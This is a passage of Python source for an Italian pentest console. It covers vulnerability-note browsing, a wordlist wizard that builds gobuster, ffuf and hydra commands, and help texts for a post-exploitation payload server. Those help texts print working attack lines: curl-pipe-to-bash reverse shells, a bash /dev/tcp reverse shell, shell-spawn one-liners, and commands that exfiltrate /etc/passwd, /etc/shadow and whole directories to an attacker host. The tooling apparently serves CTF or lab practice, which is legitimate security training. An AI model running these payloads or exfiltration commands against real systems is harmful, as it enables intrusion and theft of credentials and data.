            md_parts.append("| Protocollo | Nome |")
            md_parts.append("|------------|------|")
            for proto_key in cat_items:
                name = VULN_NAMES.get(proto_key, proto_key)
                md_parts.append(f"| `{proto_key}` | {name} |")
            md_parts.append("")
        uncategorized = available - {p for ps in VULN_CATEGORIES.values() for p in ps}
        if uncategorized:
            md_parts.append("## Altro\n")
            md_parts.append("| Protocollo | Nome |")
            md_parts.append("|------------|------|")
            for proto_key in sorted(uncategorized):
                name = VULN_NAMES.get(proto_key, proto_key)
                md_parts.append(f"| `{proto_key}` | {name} |")
            md_parts.append("")
        md_parts.append(f"**Alias supportati:** `{'`, `'.join(sorted(VULN_ALIASES.keys()))}`\n")
        render_markdown("\n".join(md_parts))
        return 0

    key = VULN_ALIASES.get(key, key)
    vuln_file = VULN_ROOT / f"{key}.md"

    if not vuln_file.exists():
        print(f"Protocollo '{raw}' non trovato.", file=sys.stderr)
        print("Usa 'vuln list' per vedere i protocolli disponibili.")
        return 1

    md_text = vuln_file.read_text(encoding="utf-8", errors="replace")
    _print_web_link("vuln", key)
    render_markdown(md_text)

    if state is not None:
        state.current_vuln = key
        state.current_tool = None
        tools = _extract_vuln_tools(md_text)
        state.last_vuln_tools = tools
        if tools:
            print(f"\nUsa 'use <num>' per selezionare un tool consigliato (1-{len(tools)}).")

    return 0


def cmd_notes(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    raw = " ".join(args.topic) if isinstance(args.topic, list) else args.topic
    key = normalize(raw)

    if key in {"list", "*", "all"}:
        md_parts = ["# Note disponibili\n"]
        available = set(discover_notes())
        for cat_name, cat_notes in NOTES_CATEGORIES.items():
            cat_items = [n for n in cat_notes if n in available]
            if not cat_items:
                continue
            md_parts.append(f"## {cat_name}\n")
            md_parts.append("| Chiave | Nome |")
            md_parts.append("|--------|------|")
            for note_key in cat_items:
                name = NOTES_NAMES.get(note_key, note_key)
                md_parts.append(f"| `{note_key}` | {name} |")
            md_parts.append("")
        uncategorized = available - {n for ns in NOTES_CATEGORIES.values() for n in ns}
        if uncategorized:
            md_parts.append("## Altro\n")
            md_parts.append("| Chiave | Nome |")
            md_parts.append("|--------|------|")
            for note_key in sorted(uncategorized):
                name = NOTES_NAMES.get(note_key, note_key)
                md_parts.append(f"| `{note_key}` | {name} |")
            md_parts.append("")
        render_markdown("\n".join(md_parts))
        return 0

    note_file = NOTES_ROOT / f"{key}.md"

    if not note_file.exists():
        print(f"Nota '{raw}' non trovata.", file=sys.stderr)
        print("Usa 'notes list' per vedere le note disponibili.")
        return 1

    md_text = note_file.read_text(encoding="utf-8", errors="replace")
    _print_web_link("notes", key)
    render_markdown(md_text)
    return 0


def _collect_find_matches(query: str) -> list[tuple[str, str, Path, list[str]]]:
    """Return list of (source_type, label, file_path, context_lines) for matches."""
    nq = normalize(query)
    results: list[tuple[str, str, Path, list[str]]] = []

    for vuln_file in sorted(VULN_ROOT.glob("*.md")) if VULN_ROOT.is_dir() else []:
        text = vuln_file.read_text(encoding="utf-8", errors="replace")
        if nq in text.lower():
            ctx = _extract_context(text, nq)
            label = VULN_NAMES.get(vuln_file.stem, vuln_file.stem)
            results.append(("vuln", label, vuln_file, ctx))

    for tool in discover_tools():
        text = tool.help_file.read_text(encoding="utf-8", errors="replace")
        if nq in text.lower():
            ctx = _extract_context(text, nq)
            results.append(("tool", tool.name, tool.help_file, ctx))

    for note_file in sorted(NOTES_ROOT.glob("*.md")) if NOTES_ROOT.is_dir() else []:
        text = note_file.read_text(encoding="utf-8", errors="replace")
        if nq in text.lower():
            ctx = _extract_context(text, nq)
            label = NOTES_NAMES.get(note_file.stem, note_file.stem)
            results.append(("notes", label, note_file, ctx))

    return results


def _extract_context(text: str, query_lower: str, context_lines: int = 1) -> list[str]:
    """Return lines surrounding each match for preview."""
    lines = text.splitlines()
    matched: list[str] = []
    for i, line in enumerate(lines):
        if query_lower in line.lower():
            start = max(0, i - context_lines)
            end = min(len(lines), i + context_lines + 1)
            snippet = " ".join(lines[start:end]).strip()
            if len(snippet) > 120:
                snippet = snippet[:117] + "..."
            matched.append(snippet)
            if len(matched) >= 3:
                break
    return matched


def _render_highlighted(text: str, query: str) -> None:
    lower_q = query.lower()
    output: list[str] = []
    for line in text.splitlines():
        idx = line.lower().find(lower_q)
        if idx >= 0:
            ql = len(query)
            output.append(line[:idx] + f"\033[94;1m{line[idx:idx+ql]}\033[0m" + line[idx+ql:])
        else:
            output.append(line)
    _paged_print(output)


def _print_web_link(section: str, key: str) -> None:
    url = _serve_get_url()
    if url:
        print(f"\n  \033[96mSLWeb:\033[0m {url}/{section}/{key}\n")


def _serve_help_main() -> None:
    render_markdown(r"""# Quick-Delivery Server

Server HTTP in background per post-exploitation.
Serve payload dinamici e file statici via `curl` dal target.

## Comandi

| Comando | Descrizione |
|---------|-------------|
| `serve on [--port N] [--lhost IP] [--lport N]` | Avvia (default: porta 2727, IP auto) |
| `serve off` | Arresta |
| `serve status` | Mostra stato corrente |
| `serve fetch [--force]` | Scarica i tool di post-exploitation in `static/` |
| `serve list` | Elenca i file in `static/` |

## Categorie di help

| Comando | Argomento |
|---------|-----------|
| `serve help upgrade` (o `u`) | Come fare l'upgrade di una shell instabile |
| `serve help upgrade2` (o `u2`) | Upgrade in-place (senza nuova connessione) |
| `serve help rev` (o `r`) | Reverse shell Bash |
| `serve help sh` | Reverse shell Python |
| `serve help static` (o `s`) | Gestione file statici e catalogo tool |
| `serve help loot` (o `l`) | Upload file dalla vulnbox e gestione loot |
""")


def _serve_help_upgrade() -> None:
    render_markdown(r"""# /upgrade — Upgrade Shell

Trasforma una shell instabile (es. netcat `/bin/sh`) in una TTY interattiva.

## Uso

```bash
curl http://<LHOST>:2727/upgrade | bash
```

## Prerequisito

Avvia un listener **socat** sulla tua macchina prima di lanciare il curl:

```bash
socat file:$(tty),raw,echo=0 tcp-listen:4444
```

## Cosa fa lo script

Tenta tre metodi in cascata:

1. **socat locale** — se già installato sul target, upgrade immediato
2. **socat statico** — scarica un binario precompilato, lo usa da `/tmp`
3. **python pty** — fallback con `python3 -c "import pty; ..."`

La connessione torna verso `LHOST:LPORT` configurati con `serve on`.
""")


def _serve_help_upgrade2() -> None:
    render_markdown(r"""# /upgrade2 — Upgrade In-Place

Upgrada la shell corrente a una TTY interattiva **senza aprire nuove connessioni**.
Ideale quando sei già dentro il target e vuoi una shell migliore direttamente lì.

## Uso

```bash
curl http://<LHOST>:2727/upgrade2 | bash
```

## Nessun prerequisito

Non serve un listener sulla tua macchina — lo script lavora solo sulla shell corrente.

## Cosa fa lo script

Tenta 9 metodi in cascata (usa il primo disponibile):

| # | Metodo | Comando | TTY piena |
|---|--------|---------|-----------|
| 1 | **python3 pty.fork** | Full PTY proxy con raw mode + resize | Sì |
| 2 | **python2 pty.fork** | Stesso approccio con python2 | Sì |
| 3 | **script** | `script -qc /bin/bash /dev/null` | Parziale |
| 4 | **expect** | `expect -c 'spawn /bin/bash; interact'` | Parziale |
| 5 | **perl** | `perl -e 'exec "/bin/sh";'` | No |
| 6 | **ruby** | `ruby -e 'exec "/bin/sh"'` | No |
| 7 | **lua** | `lua -e 'os.execute("/bin/sh")'` | No |
| 8 | **awk** | `awk 'BEGIN {system("/bin/sh")}'` | No |
| 9 | **/bin/sh -i** | Fallback diretto | No |

I metodi 1-2 (python) danno una TTY completa con frecce, Tab, history e resize.
I metodi 3-4 danno una TTY parziale. I metodi 5-9 spawnano una shell ma senza TTY.

## Differenza con /upgrade

| | `/upgrade` | `/upgrade2` |
|---|---|---|
| Connessione | Nuova reverse verso LHOST:LPORT | Nessuna, lavora in-place |
| Prerequisito | Listener (socat/nc) | Nessuno |
| TTY piena | Sì (socat) | Sì con python, parziale con altri |
| Quando usarlo | Vuoi una shell dedicata stabile | Vuoi upgradare quella che hai |
""")


def _serve_help_rev() -> None:
    render_markdown(r"""# /rev — Reverse Shell Bash

One-liner bash per ottenere una reverse shell.

## Uso

```bash
curl http://<LHOST>:2727/rev | bash
```

## Prerequisito

Listener sulla tua macchina:

```bash
nc -lvnp 4444
```

## Payload generato

```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

`LHOST` e `LPORT` sono quelli impostati con `serve on`.
""")


def _serve_help_sh() -> None:
    render_markdown(r"""# /sh — Reverse Shell Python

One-liner Python3 per ottenere una reverse shell.
Utile quando bash non supporta `/dev/tcp` (es. Debian/Ubuntu con `dash`).

## Uso

```bash
curl http://<LHOST>:2727/sh | bash
```

## Prerequisito

```bash
nc -lvnp 4444
```

## Quando usarlo

- Il target ha Python3 ma non bash con `/dev/tcp`
- Serve una shell più stabile rispetto a `/rev`
""")


def _serve_help_static() -> None:
    from http_server import TOOL_CATALOG, STATIC_ROOT, _lhost, _server
    if _server is not None:
        port = _server.server_address[1]
        base = f"http://{_lhost}:{port}"
    else:
        base = "http://<LHOST>:2727"

    lines = ["# static/ — File Statici\n"]
    lines.append("Cartella che il server serve come download diretto.")
    lines.append("Qualsiasi file dentro `static/` diventa scaricabile via HTTP.\n")
    lines.append("## Comandi\n")
    lines.append("| Comando | Descrizione |")
    lines.append("|---------|-------------|")
    lines.append("| `serve fetch` | Scarica tutti i tool del catalogo |")
    lines.append("| `serve fetch --force` | Riscarica anche se già presenti |")
    lines.append("| `serve list` | Mostra file e dimensioni |")
    lines.append("| `cp file static/` | Aggiungi un file manualmente |\n")
    lines.append("## Catalogo tool\n")
    lines.append("```bash")
    for entry in TOOL_CATALOG:
        name = entry["name"]
        if name.endswith(".sh"):
            lines.append(f"curl {base}/{name} | bash")
        elif name.endswith(".exe"):
            lines.append(f"curl {base}/{name} -o {name}")
        else:
            lines.append(f"curl {base}/{name} -o {name} && chmod +x {name}")
    lines.append("```")
    render_markdown("\n".join(lines))


def _loot_help() -> None:
    render_markdown(r"""# loot — Gestione File dalla Vulnbox

Ricevi e gestisci file caricati dalla vulnbox tramite `curl` sull'endpoint `/upload`.
I file vengono salvati nella cartella `loot/` con timestamp e IP sorgente.

## Comandi

| Comando | Descrizione |
|---------|-------------|
| `loot` o `loot list` | Elenca i file ricevuti |
| `loot read <nome\|num>` | Mostra il contenuto di un file (solo testo) |
| `loot clear` | Elimina tutti i file loot |
| `loot help` | Mostra questo aiuto |

## Come caricare file dalla vulnbox

Dalla macchina vittima, usa `curl` per inviare file al server SLConsole:

```bash
# Upload file singolo (multipart form — il più comune)
curl -F "file=@/etc/passwd" http://<LHOST>:2727/upload

# Upload via pipe (utile per output di comandi)
cat /etc/shadow | curl -X POST -d @- http://<LHOST>:2727/upload/shadow.txt

# Upload con PUT (nome file nell'URL)
curl -T /tmp/database.db http://<LHOST>:2727/upload/database.db

# Esfiltra cartelle intere via tar
tar czf - /etc /var/log | curl -X POST -d @- http://<LHOST>:2727/upload/exfil.tar.gz

# Upload multipli in un colpo solo
for f in /etc/passwd /etc/shadow /etc/hosts; do
    curl -F "file=@$f" http://<LHOST>:2727/upload
done
```

## Dove finiscono i file

I file vengono salvati in `loot/` con il formato:

```
<IP_SORGENTE>_<DATA>_<ORA>_<NOME_ORIGINALE>
```

Esempio: `10.10.14.5_2024-01-15_14-30-22_passwd`

## Consultare i file

- **Console:** `loot list` per vedere i file, `loot read <num>` per il contenuto
- **Web:** sezione **Loot** nella barra di navigazione di SLWeb
- **Filesystem:** cartella `loot/` nella root del progetto
""")


_SERVE_HELP_TOPICS: dict[str, callable] = {
    "upgrade": _serve_help_upgrade,
    "u": _serve_help_upgrade,
    "upgrade2": _serve_help_upgrade2,
    "u2": _serve_help_upgrade2,
    "rev": _serve_help_rev,
    "r": _serve_help_rev,
    "sh": _serve_help_sh,
    "static": _serve_help_static,
    "s": _serve_help_static,
    "loot": _loot_help,
    "l": _loot_help,
}


def cmd_serve(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    action = normalize(getattr(args, "action", "status"))
    if action in {"help", "h", "-h", "--help"}:
        subtopic = getattr(args, "subtopic", None)
        if subtopic:
            handler = _SERVE_HELP_TOPICS.get(normalize(subtopic))
            if handler:
                handler()
            else:
                print(f"Categoria sconosciuta: {subtopic}")
                print("Categorie: upgrade (u), upgrade2 (u2), rev (r), sh, static (s), loot (l)")
        else:
            _serve_help_main()
        return 0
    if action in {"on", "start"}:
        port = getattr(args, "port", 2727)
        lhost = getattr(args, "lhost", None)
        lport = getattr(args, "lport", 4444)

        if lhost is None:
            ifaces = _serve_discover_interfaces()
            if not ifaces:
                print("Nessuna interfaccia di rete trovata.", file=sys.stderr)
                return 1
            if len(ifaces) == 1:
                lhost = ifaces[0][1]
            else:
                print("\n  Interfacce disponibili:\n")
                for i, (name, addr) in enumerate(ifaces, 1):
                    print(f"    [{i}] {name:<12s}  {addr}")
                print()
                while True:
                    try:
                        choice = input("  Scegli interfaccia [1]: ").strip()
                    except (EOFError, KeyboardInterrupt):
                        print()
                        return 0
                    if not choice:
                        choice = "1"
                    if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
                        lhost = ifaces[int(choice) - 1][1]
                        break
                    print(f"  Inserisci un numero da 1 a {len(ifaces)}.")

        print(_serve_start(port=port, lhost=lhost, lport=lport))
        return 0
    if action in {"off", "stop"}:
        print(_serve_stop())
        return 0
    if action == "fetch":
        force = getattr(args, "force", False)
        print(_serve_fetch(force=force))
        return 0
    if action in {"list", "ls"}:
        print(_serve_list_static())
        return 0
    print(_serve_status())
    return 0


def cmd_loot(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    action = normalize(getattr(args, "action", "list"))

    if action in {"help", "h", "-h", "--help"}:
        _loot_help()
        return 0

    if action in {"list", "ls", "l"}:
        print(_serve_list_loot())
        return 0

    if action in {"read", "cat", "show", "view"}:
        target = getattr(args, "target", None)
        if not target:
            print("Specifica il nome o il numero del file. Usa 'loot list' per vedere i file.", file=sys.stderr)
            return 1
        from http_server import _discover_loot
        items = _discover_loot()
        if target.isdigit():
            idx = int(target) - 1
            if 0 <= idx < len(items):
                target = items[idx]["name"]
            else:
                print(f"Indice {int(target)} fuori range (1-{len(items)}).", file=sys.stderr)
                return 1
        content = _serve_read_loot(target)
        if content is None:
            print(f"File non trovato: {target}", file=sys.stderr)
            return 1
        print(f"\n\033[1m--- {target} ---\033[0m\n")
        _paged_print(content.splitlines())
        return 0

    if action in {"clear", "clean", "purge"}:
        print(_serve_clear_loot())
        return 0

    print(f"Azione sconosciuta: {action}")
    print("Azioni disponibili: list, read <nome|num>, clear, help")
    return 1


# ---------------------------------------------------------------------------
# wordfind — Wizard per wordlist SecLists
# ---------------------------------------------------------------------------

_SECLISTS_BASE = "/usr/share/seclists"

_SCOPE_MENU = [
    ("dir", "Directory / file"),
    ("sub", "Sottodomini"),
    ("vhost", "Virtual host (vhost)"),
    ("param", "Parametri (GET/POST)"),
    ("user", "Username"),
    ("pass", "Password"),
    ("api", "API endpoint"),
]

_TECH_MENU = [
    ("php", "PHP", [".php", ".phtml"]),
    ("asp", "ASP / ASPX", [".asp", ".aspx"]),
    ("java", "Java / JSP", [".jsp", ".do", ".action"]),
    ("python", "Python (Django/Flask)", [".py"]),
    ("node", "Node.js", [".js", ".json"]),
    ("wp", "WordPress", [".php"]),
    ("joomla", "Joomla", [".php"]),
    ("generic", "Non so / generico", []),
]

_INTENSITY_DIR = [
    ("fast", "Veloce", "~5k parole", "⚡ primo giro"),
    ("medium", "Media", "~20k parole", "⚖️  buon compromesso"),
    ("full", "Completa", "~220k parole", "🔍 esaustiva"),
]

_INTENSITY_SUB = [
    ("fast", "Veloce", "~5k sottodomini", "⚡"),
    ("medium", "Media", "~20k sottodomini", "⚖️"),
    ("full", "Completa", "~110k sottodomini", "🔍"),
]

_INTENSITY_GENERIC = [
    ("fast", "Veloce", "wordlist piccola", "⚡"),
    ("medium", "Media", "wordlist media", "⚖️"),
    ("full", "Completa", "wordlist grande", "🔍"),
]

_API_TYPE_MENU = [
    ("rest", "REST generico"),
    ("graphql", "GraphQL"),
    ("swagger", "Swagger / OpenAPI"),
    ("unknown", "Non so"),
]

_PASS_CONTEXT_MENU = [
    ("web", "Login web generico"),
    ("service", "SSH / FTP / servizio di rete"),
    ("offline", "Hash da crackare (offline)"),
]

_LANG_MENU = [
    ("en", "Inglese (default)"),
    ("it", "Italiano"),
    ("es", "Spagnolo"),
    ("de", "Tedesco"),
    ("fr", "Francese"),
    ("mixed", "Misto / non importa"),
]

# Wordlist database: (relative path from seclists, approx size label)
_WL = {
    # Directory / files
    "dir_fast":    ("Discovery/Web-Content/common.txt", "4.7k"),
    "dir_medium":  ("Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt", "220k"),
    "dir_full":    ("Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt", "1.3M"),
    "dir_small":   ("Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt", "87k"),
    "raft_dirs":   ("Discovery/Web-Content/raft-medium-directories.txt", "30k"),
    "raft_files":  ("Discovery/Web-Content/raft-medium-files.txt", "17k"),
    "raft_dirs_l": ("Discovery/Web-Content/raft-large-directories.txt", "62k"),
    "raft_files_l":("Discovery/Web-Content/raft-large-files.txt", "37k"),
    "dir_2_3_small": ("Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt", "87k"),
    # Tech-specific
    "php_fuzz":    ("Discovery/Web-Content/Programming-Language-Specific/PHP.fuzz.txt", "274"),
    "asp_fuzz":    ("Discovery/Web-Content/Programming-Language-Specific/ASP.NET/CommonBackdoors-ASP.fuzz.txt", "120"),
    "java_fuzz":   ("Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt", "200"),
    "wp_content":  ("Discovery/Web-Content/CMS/wordpress.fuzz.txt", "1.2k"),
    "wp_plugins":  ("Discovery/Web-Content/CMS/wp-plugins.fuzz.txt", "13k"),
    "wp_themes":   ("Discovery/Web-Content/CMS/wp-themes.fuzz.txt", "500"),
    "joomla_fuzz": ("Discovery/Web-Content/CMS/joomla-plugins.fuzz.txt", "1k"),
    # Subdomains
    "sub_fast":    ("Discovery/DNS/subdomains-top1million-5000.txt", "5k"),
    "sub_medium":  ("Discovery/DNS/subdomains-top1million-20000.txt", "20k"),
    "sub_full":    ("Discovery/DNS/subdomains-top1million-110000.txt", "110k"),
    "sub_names":   ("Discovery/DNS/namelist.txt", "1.9k"),
    "sub_bitquark": ("Discovery/DNS/bitquark-subdomains-top100000.txt", "100k"),
    "sub_fierce":  ("Discovery/DNS/fierce-hostlist.txt", "2.5k"),
    # Parameters
    "param_burp":  ("Discovery/Web-Content/burp-parameter-names.txt", "6.5k"),
    "param_top":   ("Discovery/Web-Content/api/api-endpoints.txt", "800"),
    # Usernames
    "user_names":  ("Usernames/Names/names.txt", "10k"),
    "user_top":    ("Usernames/top-usernames-shortlist.txt", "17"),
    "user_xato":   ("Usernames/xato-net-10-million-usernames.txt", "8.3M"),
    "user_cirt":   ("Usernames/cirt-default-usernames.txt", "827"),
    "user_mssql_default": ("Usernames/mssql-betterdefaultpasslist.txt", "110"),
    "user_service_default": ("Usernames/CommonAdminBase64.txt", "57"),
    "user_unix":   ("Usernames/unix_users.txt", "167"),
    "user_satanlist": ("Usernames/satanlist.txt", "87"),
    # Passwords — common credentials
    "pass_top10k": ("Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt", "10k"),
    "pass_top1m":  ("Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt", "1M"),
    "pass_rockyou": ("/usr/share/wordlists/rockyou.txt", "14M"),
    "pass_500":    ("Passwords/Common-Credentials/500-worst-passwords.txt", "500"),
    "pass_common": ("Passwords/Common-Credentials/common-passwords-win.txt", "815"),
    "pass_default_web": ("Passwords/Default-Credentials/default-passwords.txt", "1.2k"),
    "pass_10k_most_common": ("Passwords/Common-Credentials/10k-most-common.txt", "10k"),
    "pass_100k":   ("Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt", "100k"),
    # Passwords — default credentials
    "pass_tomcat": ("Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt", "79"),
    "pass_ftp_default": ("Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt", "52"),
    "pass_mssql_default": ("Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt", "60"),
    "pass_mysql_default": ("Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt", "15"),
    "pass_postgres_default": ("Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt", "16"),
    "pass_ssh_default": ("Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt", "40"),
    # Passwords — leaked databases
    "pass_darkweb_top1k": ("Passwords/Leaked-Databases/alleged-gmail-passwords.txt", "18k"),
    "pass_openwall": ("Passwords/Leaked-Databases/openwall.net-all.txt", "3.7k"),
    "pass_hak5":     ("Passwords/Leaked-Databases/hak5.txt", "2.4k"),
    # Passwords — WiFi / WPA
    "pass_wifi_probable": ("Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt", "4.8k"),
    # Language-specific passwords
    "pass_it":     ("Passwords/Common-Credentials/Language-Specific/Italian_Pwdb_common-password-list-top-150.txt", "150"),
    "pass_es":     ("Passwords/Common-Credentials/Language-Specific/Spanish_common-usernames-and-passwords.txt", "1k"),
    "pass_de":     ("Passwords/Common-Credentials/Language-Specific/German_common-password-list-top-10000.txt", "10k"),
    "pass_fr":     ("Passwords/Common-Credentials/Language-Specific/French-common-password-list-top-20000.txt", "20k"),
    # API
    "api_endpoints": ("Discovery/Web-Content/api/api-endpoints-res.txt", "2.2k"),
    "api_objects":   ("Discovery/Web-Content/api/objects.txt", "2.9k"),
    "api_common":    ("Discovery/Web-Content/common-api-endpoints-mazen160.txt", "174"),
    "api_graphql":   ("Discovery/Web-Content/graphql.txt", "80"),
}

_SECLISTS_GITHUB = "https://raw.githubusercontent.com/danielmiessler/SecLists/master"

def _wl_link(key: str) -> str:
    p = _WL[key][0]
    if p.startswith("/"):
        if "rockyou" in p:
            return "https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases"
        return ""
    return f"{_SECLISTS_GITHUB}/{p}"


def _wl_path(key: str) -> str:
    p = _WL[key][0]
    if p.startswith("/"):
        if os.path.isfile(p):
            return p
        local = os.path.join(os.path.dirname(os.path.abspath(__file__)), os.path.basename(p))
        if os.path.isfile(local):
            return local
        return p
    full = f"{_SECLISTS_BASE}/{p}"
    if os.path.isfile(full):
        return full
    local = os.path.join(os.path.dirname(os.path.abspath(__file__)), os.path.basename(p))
    if os.path.isfile(local):
        return local
    return full


def _wl_label(key: str) -> str:
    path, size = _WL[key]
    name = path.rsplit("/", 1)[-1]
    if size:
        return f"{name}  ({size})"
    return name


def _wf_ask(prompt: str, options: list[tuple], default: int = 1) -> int:
    print(f"\n  \033[1m{prompt}\033[0m\n")
    for i, opt in enumerate(options, 1):
        label = opt[1] if len(opt) >= 2 else opt[0]
        extra = ""
        if len(opt) >= 4:
            extra = f"  {opt[2]:20s} {opt[3]}"
        elif len(opt) >= 3:
            extra = f"  \033[90m{opt[2]}\033[0m"
        print(f"    [{i}] {label}{extra}")
    print()
    while True:
        try:
            raw = input(f"  Scelta [{default}]: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return -1
        if not raw:
            return default
        if raw.isdigit() and 1 <= int(raw) <= len(options):
            return int(raw)
        print(f"  Inserisci un numero da 1 a {len(options)}.")


def _wf_ask_text(prompt: str, default: str = "") -> str:
    try:
        raw = input(f"  {prompt}: ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return default
    return raw or default


def _parse_target(url: str) -> dict:
    from urllib.parse import urlparse
    parsed = urlparse(url)
    scheme = parsed.scheme or "http"
    host = parsed.hostname or url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    port = parsed.port
    path = parsed.path or "/"
    domain = host
    base = f"{scheme}://{parsed.netloc or host}"
    if path and path != "/":
        base_with_path = f"{base}{path.rstrip('/')}"
    else:
        base_with_path = base
    return {
        "url": url, "scheme": scheme, "host": host, "port": port,
        "path": path, "domain": domain, "base": base,
        "base_path": base_with_path,
    }


def _build_dir_result(target: dict, tech_key: str, tech_exts: list[str], intensity: str) -> dict:
    wordlists = []
    extras = []

    if intensity == "fast":
        wordlists.append("dir_fast")
    elif intensity == "medium":
        wordlists.append("dir_medium")
        wordlists.append("dir_fast")
    else:
        wordlists.append("dir_full")
        wordlists.append("dir_medium")

    wordlists.append("raft_files")

    if tech_key == "php":
        extras.append("php_fuzz")
        tech_exts = [".php", ".phtml", ".txt", ".bak", ".php.bak"]
    elif tech_key == "asp":
        extras.append("asp_fuzz")
        tech_exts = [".asp", ".aspx", ".txt", ".bak", ".config"]
    elif tech_key == "java":
        extras.append("java_fuzz")
        tech_exts = [".jsp", ".do", ".action", ".xml", ".txt"]
    elif tech_key == "python":
        tech_exts = [".py", ".txt", ".json", ".yaml"]
    elif tech_key == "node":
        tech_exts = [".js", ".json", ".txt", ".map"]
    elif tech_key == "wp":
        extras.extend(["wp_content", "wp_plugins", "wp_themes"])
        tech_exts = [".php", ".txt", ".bak"]
    elif tech_key == "joomla":
        extras.append("joomla_fuzz")
        tech_exts = [".php", ".txt", ".bak"]
    else:
        tech_exts = [".txt", ".bak", ".html"]

    ext_str = ",".join(e.lstrip(".") for e in tech_exts)
    ext_dot = ",".join(tech_exts)
    main_wl = wordlists[0]
    url = target["base_path"]

    commands = []
    commands.append(("gobuster", f"gobuster dir -u {url} -w {_wl_path(main_wl)} -x {ext_str} -t 50"))
    commands.append(("ffuf", f"ffuf -u {url}/FUZZ -w {_wl_path(main_wl)} -e {ext_dot} -t 50 -c"))
    commands.append(("dirb", f"dirb {url} {_wl_path(main_wl)} -X {ext_dot}"))
    commands.append(("feroxbuster", f"feroxbuster -u {url} -w {_wl_path(main_wl)} -x {ext_str} -t 50"))
    commands.append(("wfuzz", f"wfuzz -u {url}/FUZZ -w {_wl_path(main_wl)} --hc 404 -t 50"))
    commands.append(("dirsearch", f"dirsearch -u {url} -w {_wl_path(main_wl)} -e {ext_str} -t 50"))

    return {"wordlists": wordlists + extras, "extensions": ext_dot, "commands": commands}


def _build_sub_result(target: dict, intensity: str) -> dict:
    domain = target["domain"]
    wordlists = []

    if intensity == "fast":
        wordlists = ["sub_fast", "sub_names"]
    elif intensity == "medium":
        wordlists = ["sub_medium", "sub_names", "sub_bitquark"]
    else:
        wordlists = ["sub_full", "sub_bitquark", "sub_names"]

    main_wl = wordlists[0]
    commands = []
    commands.append(("gobuster", f"gobuster dns -d {domain} -w {_wl_path(main_wl)} -t 50"))
    commands.append(("ffuf", f"ffuf -u http://FUZZ.{domain} -w {_wl_path(main_wl)} -c"))
    commands.append(("wfuzz", f"wfuzz -u http://FUZZ.{domain} -w {_wl_path(main_wl)} --hc 404 -t 50"))
    commands.append(("amass", f"amass enum -d {domain} -w {_wl_path(main_wl)}"))
    commands.append(("dnsenum", f"dnsenum --dnsserver 8.8.8.8 -f {_wl_path(main_wl)} {domain}"))

    return {"wordlists": wordlists, "commands": commands}


def _build_vhost_result(target: dict, intensity: str) -> dict:
    domain = target["domain"]
    base = target["base"]
    wordlists = []

    if intensity == "fast":
        wordlists = ["sub_fast", "sub_names"]
    elif intensity == "medium":
        wordlists = ["sub_medium", "sub_names"]
    else:
        wordlists = ["sub_full", "sub_bitquark"]

    main_wl = wordlists[0]
    commands = []
    commands.append(("gobuster", f"gobuster vhost -u {base} -w {_wl_path(main_wl)} --append-domain -t 50"))
    commands.append(("ffuf", f'ffuf -u {base} -H "Host: FUZZ.{domain}" -w {_wl_path(main_wl)} -c -fs 0'))
    commands.append(("wfuzz", f'wfuzz -u {base} -H "Host: FUZZ.{domain}" -w {_wl_path(main_wl)} --hc 404 -t 50'))

    return {"wordlists": wordlists, "commands": commands}


def _build_param_result(target: dict, intensity: str) -> dict:
    url = target["base_path"]
    wordlists = ["param_burp", "param_top"]

    main_wl = wordlists[0]
    commands = []
    commands.append(("ffuf GET", f'ffuf -u "{url}?FUZZ=test" -w {_wl_path(main_wl)} -c -fs 0'))
    commands.append(("ffuf POST", f'ffuf -u {url} -X POST -d "FUZZ=test" -w {_wl_path(main_wl)} -c -fs 0'))
    commands.append(("wfuzz GET", f'wfuzz -u "{url}?FUZZ=test" -w {_wl_path(main_wl)} --hc 404 -t 50'))
    commands.append(("arjun", f"arjun -u {url} -w {_wl_path(main_wl)}"))

    return {"wordlists": wordlists, "commands": commands}


def _build_user_result(target: dict, intensity: str) -> dict:
    wordlists = []
    if intensity == "fast":
        wordlists = ["user_top", "user_names"]
    elif intensity == "medium":
        wordlists = ["user_names", "user_top"]
    else:
        wordlists = ["user_xato", "user_names"]

    return {"wordlists": wordlists, "commands": []}


def _build_pass_result(target: dict, context: str, lang: str, username: str,
                       intensity: str, user_wl_key: str | None = None) -> dict:
    url = target["base_path"]
    wordlists = []

    if intensity == "fast":
        wordlists = ["pass_500", "pass_default_web"]
    elif intensity == "medium":
        wordlists = ["pass_top10k", "pass_common"]
    else:
        wordlists = ["pass_top1m", "pass_rockyou"]

    lang_wl = {"it": "pass_it", "es": "pass_es", "de": "pass_de", "fr": "pass_fr"}
    if lang in lang_wl:
        wordlists.append(lang_wl[lang])

    user = username or "admin"
    user_flag = f"-L {_wl_path(user_wl_key)}" if user_wl_key else f"-l {user}"
    user_flag_med = f"-U {_wl_path(user_wl_key)}" if user_wl_key else f"-u {user}"
    user_flag_cme = f"-u {_wl_path(user_wl_key)}" if user_wl_key else f"-u {user}"
    main_wl = wordlists[0]
    commands = []
    user_wls = [user_wl_key] if user_wl_key else []

    if context == "web":
        commands.append(("hydra", f'hydra {user_flag} -P {_wl_path(main_wl)} {target["host"]} http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"'))
